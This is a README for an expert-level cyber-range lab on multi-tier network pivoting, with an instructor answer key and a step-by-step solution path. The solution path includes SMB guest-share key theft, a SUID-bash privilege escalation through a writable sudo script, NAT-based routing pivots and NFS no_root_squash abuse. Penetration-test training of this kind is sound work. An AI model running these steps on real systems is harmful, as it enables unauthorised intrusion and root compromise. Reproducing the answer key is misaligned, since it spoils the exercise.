# cr-18-n5b — Multi-Tier Network Pivoting (Capstone)

Offensive / red-team hands-on lab. A trainee starts in a DMZ and must chain
two routing-based pivots and two file-service misconfigurations to reach a
flag on a Management host that no external system can touch. Replaces the
earlier VLAN-hopping design (not viable on this platform — see *Design
history* below).

- **Course code:** N5b
- **Type:** CR (Cyber Range)
- **Difficulty:** Expert
- **Duration:** 50 min
- **Audience:** Penetration Tester

---

## Topology

Three routed tiers, segmented by the router's firewall. Two hosts are
dual-homed and act as the only bridges between tiers — these are the pivots
the trainee must own.

| Host | Tier(s) | IP(s) | Role |
|------|---------|-------|------|
| `attacker` | DMZ | 10.10.10.10 | Trainee console |
| `dmzhost` | DMZ + Internal | 10.10.10.2 / 10.10.20.2 | SMB entry point; first pivot |
| `appserver` | Internal | 10.10.20.20 | Mounts the NFS share; hosts the A5 pivot-proof flag |
| `nfsserver` | Internal + Management | 10.10.20.30 / 10.10.30.30 | Exports the misconfigured share; second pivot |
| `mgmthost` | Management | 10.10.30.100 | Final target |
| `router` | all | .1 on each tier | Enforces segmentation |

```
attacker ── DMZ 10.10.10.0/24 ── dmzhost
                                    │ dual-homed
                Internal 10.10.20.0/24
                  ├── appserver
                  └── nfsserver
                                    │ dual-homed
                Management 10.10.30.0/24
                  └── mgmthost
```

**Segmentation:** the router's FORWARD chain default-drops all inter-tier
traffic except Internal→Management. DMZ cannot reach Internal or Management
through the router at all — the attacker must pivot through `dmzhost` and
`nfsserver`, whose second NICs sit directly on the next tier. INPUT is left
permissive so the management plane is never cut off.

`appserver`, `nfsserver`, and `mgmthost` are `hidden: true` — no console
access, reachable only over the network once pivoted to.

---

## Deployment

```bash
ansible-playbook -i <inventory> playbook.yml
```

Play order matters: `dmzhost` must provision before `nfsserver`/`appserver`
are attacked, and `router` segmentation should be in place before the lab is
handed to a trainee (otherwise DMZ→Internal is reachable directly and the
pivot isn't enforced). No cross-host `hostvars` dependencies like N5a's key
handoff — each host is self-contained.

### Dependencies

- **`community.general`** — not required by this playbook (no ufw tasks; router
  uses `ansible.builtin.iptables` + `ansible.posix.sysctl`).
- **`ansible.posix`** collection — required for the `sysctl` task on `router`:
  `ansible-galaxy collection install ansible.posix`

---

## Answer key

> Instructor reference — do not distribute to trainees.

| Level | Flag | Where | How it's obtained |
|-------|------|-------|--------------------|
| A3 | `smb_flag` | `/srv/public/smb_flag.txt` on dmzhost | Enumerate SMB (445), read guest share |
| A4 | `dmz_root_flag` | `/root/dmz_root_flag.txt` on dmzhost, root-only | Escalate via writable `netcheck.sh` + NOPASSWD sudo |
| A5 | `pivot_flag` | HTTP `:8080` on appserver (Internal-only) | Confirms DMZ→Internal routing pivot works |
| A6 | `nfs_flag` | `/srv/share/.nfs_flag` on nfsserver, root-only, inside the export | NFS `no_root_squash` trust abuse |
| A7 | `mgmt_flag` | HTTP `:8080` on mgmthost | Confirms Internal→Management pivot + final reach |

All five flags are **APG-generated per sandbox** (`variables.yml`) — no fixed
strings, so answers can't be shared between trainees. Static credentials:
`dmzadmin` (key-based, key leaked via SMB).

---

## Solution path (reference)

**A3 — DMZ foothold (SMB)**
```bash
nmap -p 445 10.10.10.2
smbclient -N -L //10.10.10.2/
smbclient -N //10.10.10.2/public
# get id_rsa, get README.txt, get smb_flag.txt
chmod 600 id_rsa
ssh -i id_rsa dmzadmin@10.10.10.2
```

**A4 — Local escalation on dmzhost**
```bash
sudo -l
# -> (root) NOPASSWD: /opt/netcheck/netcheck.sh
ls -la /opt/netcheck/netcheck.sh          # world-writable
echo -e '#!/bin/bash\nchmod +s /bin/bash' > /opt/netcheck/netcheck.sh
sudo /opt/netcheck/netcheck.sh
/bin/bash -p                               # root shell
cat /root/dmz_root_flag.txt
```

**A5 — Pivot DMZ → Internal (routing)**
```bash
# on dmzhost, as root:
ip a                                       # discover the second NIC (10.10.20.2)
sysctl -w net.ipv4.ip_forward=1
iptables -t nat -A POSTROUTING -o <internal-if> -j MASQUERADE

# on attacker:
sudo ip route add 10.10.20.0/24 via 10.10.10.2
curl http://10.10.20.20:8080/            # -> pivot_flag
```

**A6 — NFS trust abuse (Internal)**
```bash
# from attacker, via the pivot, or directly on dmzhost as root:
showmount -e 10.10.20.30
mkdir /mnt/nfs && mount -t nfs 10.10.20.30:/srv/share /mnt/nfs
cat /mnt/nfs/.nfs_flag                     # readable because no_root_squash
                                            # preserves root identity from the client
```
Note: because the flag file lives inside the export and the trainee is
already root on the mounting client (from A4), direct read works. The
classic no_root_squash technique — plant a root-owned SUID binary on the
share and execute it from a *different* client (e.g. `appserver`) to gain
root on that specific host — is the more broadly applicable technique and
worth teaching/demonstrating even though this chain's flag doesn't strictly
require it. Consider walking trainees through both.

**A7 — Pivot Internal → Management + final capture**
```bash
# on nfsserver, as root (reached via A6):
ip a                                       # discover 10.10.30.30
  sysctl -w net.ipv4.ip_forward=1
iptables -t nat -A POSTROUTING -o <mgmt-if> -j MASQUERADE

# on attacker:
sudo ip route add 10.10.30.0/24 via 10.10.20.30   # via the dmzhost pivot
curl http://10.10.30.100:8080/             # -> mgmt_flag
```

---

## Design notes & caveats

- **Feasibility history:** this course was originally scoped around VLAN
  tagging/hopping (802.1Q, DTP switch-spoofing). A PoC test confirmed the
  platform's Neutron fabric strips VLAN-tagged frames between VMs even on
  the same network (single-tag and double-tag probes both failed to reach a
  listener, despite plain ICMP working) — real VLAN hopping is not
  achievable here without OpenStack trunk ports/nested GNS3, which are
  outside normal course-authoring. The course was redesigned around routed
  subnets instead. See conversation history for the full PoC.

- **The pivot mechanism is IP forwarding + MASQUERADE, not SSH tunneling.**
  This is deliberate (expert-level, "manipulate routing" objective) but it
  is the single most fragile step: if MASQUERADE is omitted, Neutron's
  anti-spoofing may drop the forwarded packets since they'd appear to
  originate from an IP the port doesn't own. **This has not been end-to-end
  verified on the platform** — run a smoke test (get root on `dmzhost`,
  enable forward+MASQUERADE, confirm `attacker` can reach `10.10.20.20`)
  before relying on this design for a live cohort.

- **A4's escalation is intentionally narrow**, not general sudo. `dmzadmin`
  can run exactly one world-writable script as root
  (`/opt/netcheck/netcheck.sh`, NOPASSWD). This was chosen over giving
  `dmzadmin` full sudo specifically so the leaked key doesn't hand over
  root for free — the trainee has to find and exploit a second, genuine
  misconfiguration (`sudo -l` + writable script).

- **A6 flag placement simplifies the intended attack.** Placing `nfs_flag`
  inside the export (root-only) means a trainee already root on a mounting
  client can read it directly, without needing the full
  plant-SUID-and-execute-on-another-host maneuver. This still demonstrates
  the trust relationship authentically (root-on-any-client = root-on-export
  contents), but if you want to force the classic technique, move the flag
  to require execution as a *different* user/host (e.g. only readable by a
  service account on `appserver`).

- **A4's ATT&CK technique is local, not network-based** (unlike every other
  step). It doesn't map to the course's T1190/T1133/T1572/T1046/T1199/T1068
  set. Closest fit: **T1548.003 — Sudo and Sudo Caching**. Either add it to
  the course's ATT&CK list, or present A4 as a sub-step of A3 rather than
  its own objective if you want to keep the technique list pure network.

- **Port 8080 is reused** by both the A5 pivot-proof service (`appserver`)
  and the A7 final service (`mgmthost`) — harmless since they're different
  hosts, but worth knowing if any tooling assumes port uniqueness across
  the topology.

- **No cross-host secrets to keep in sync** (unlike N5a's key handoff via
  `hostvars`) — each host's flag is self-contained via its own APG variable.

### Suggested MITRE ATT&CK mapping

**T1046** (service discovery, every tier) · **T1133** (SMB as an exposed
external-facing service) · **T1199** (SMB key leak + NFS trust abuse) ·
**T1572** (both routing pivots) · **T1068** (root via NFS no_root_squash) ·
**T1548.003** (A4 local escalation — see caveat above).

---

## Timing

Expert, 50 min. Two routing pivots (8–12 min each incl. recon) + SMB
enumeration (~8 min) + local escalation (~5 min) + NFS abuse (~8 min) +
final capture (~5 min) is a realistic ~45–50 min for an expert trainee who
knows the techniques but works through the routing setup carefully. The
floor is dominated by the two forward+MASQUERADE pivots, not recall — set
minimum solving time accordingly once the pivot mechanism is verified end
to end.
